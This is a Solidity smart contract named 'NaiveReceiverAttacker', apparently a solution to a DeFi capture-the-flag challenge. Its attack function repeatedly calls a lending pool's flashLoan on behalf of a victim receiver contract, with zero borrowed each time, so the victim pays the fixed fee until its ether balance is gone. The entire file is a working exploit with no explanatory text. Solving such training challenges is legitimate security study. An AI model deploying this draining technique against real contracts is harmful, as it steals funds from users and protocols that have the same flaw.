// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaiveLenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
    function fixedFee() external pure returns (uint256);
}

interface INaiveLoanReceiver {
    function receiveEther(uint256 fee) external payable;
}

contract NaiveReceiverAttacker {
    address private immutable owner;
    constructor() {
        owner = msg.sender;
    }
    function attack(INaiveLenderPool pool, INaiveLoanReceiver receiver) external {
        require(msg.sender == owner, "Must be owner");
        // Get number of times we can call receiver before they can't pay fee
        uint receiverCalls = address(receiver).balance / pool.fixedFee();
        for (uint i = 0; i < receiverCalls; i++) {
            pool.flashLoan(address(receiver), 0);
        }
    }
}